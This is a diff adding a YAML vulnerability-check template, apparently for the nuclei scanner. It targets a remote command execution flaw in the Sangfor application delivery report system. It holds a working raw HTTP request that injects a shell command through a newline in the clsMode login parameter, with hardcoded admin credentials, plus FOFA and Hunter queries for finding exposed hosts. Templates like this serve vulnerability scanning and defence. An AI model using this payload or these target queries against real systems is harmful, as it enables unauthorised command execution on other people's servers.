@@ -1,0 +1,32 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - Filesystem
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /rep/login HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          clsMode=cls_mode_login%0Adf%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
+id: sangfor-report-rep-login-rce
+info:
+    author: cmz
+    description: 深信服应用交付报表clsMode存在rce，可以直接执行系统命令。
+    metadata:
+        fofa-query: fid="iaytNA57019/kADk8Nev7g=="
+        hunter-query: app.name="SANGFOR 深信服应用交付报表系统" && web.body="/rep/login"
+        veified: true
+    name: 深信服应用交付报表远程命令执行
+    reference:
+        - none
+    severity: critical
+    tags:
+        - sangfor
+        - 深信服应用交付报表系统
